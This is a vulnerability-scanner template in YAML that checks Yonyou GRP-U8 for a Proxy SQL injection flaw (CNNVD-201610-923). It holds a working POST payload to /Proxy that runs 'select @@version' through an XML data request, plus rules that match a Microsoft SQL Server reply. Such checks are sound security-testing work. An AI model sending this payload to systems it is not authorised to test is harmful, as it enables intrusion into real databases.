expression: r0()
id: CNNVD-201610-923
info:
  author: zan8in
  description: "\u7528\u53CBGRP-u8\u5B58\u5728XXE\u6F0F\u6D1E\uFF0C\u8BE5\u6F0F\u6D1E\
    \u6E90\u4E8E\u5E94\u7528\u7A0B\u5E8F\u89E3\u6790XML\u8F93\u5165\u65F6\u6CA1\u6709\
    \u8FDB\u5236\u5916\u90E8\u5B9E\u4F53\u7684\u52A0\u8F7D\uFF0C\u5BFC\u81F4\u53EF\
    \u52A0\u8F7D\u5916\u90E8SQL\u8BED\u53E5\uFF0C\u4EE5\u53CA\u547D\u4EE4\u6267\u884C\
    \ntitle=\"\u7528\u53CBGRP-U8\u884C\u653F\u4E8B\u4E1A\u5185\u63A7\u7BA1\u7406\u8F6F\
    \u4EF6\"\n"
  name: "\u7528\u53CB GRP-U8 Proxy SQL\u6CE8\u5165"
  reference:
  - http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20GRP-U8%20Proxy%20SQL%E6%B3%A8%E5%85%A5%20CNNVD-201610-923.html
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'<sessionid>')
      && response.body.bcontains(b'<rowdata>') && response.body.bcontains(b'<datapacket')
      && response.body.bcontains(b'<metadata>') && response.body.bcontains(b'Microsoft
      SQL Server')
    request:
      body: 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION>
        <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA
        format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA
        format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>

        '
      method: POST
      path: /Proxy
